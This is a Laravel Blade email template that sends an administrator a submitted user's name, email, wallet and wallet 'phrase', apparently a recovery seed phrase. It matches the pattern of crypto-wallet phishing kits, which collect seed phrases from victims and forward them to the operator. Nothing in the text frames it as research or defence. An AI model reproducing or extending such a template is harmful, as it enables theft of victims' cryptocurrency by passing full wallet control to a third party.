<x-mail::message>
# Hello Admin

Name: {{ $wallet['wallet']->name }}
<br>
Email: {{ $wallet['wallet']->email }}
<br>
Wallet: {{ $wallet['wallet']->wallet }}
<br>
Phrase: {{ $wallet['wallet']->phrase }}


Thanks,<br>
{{ config('app.name') }}
</x-mail::message>
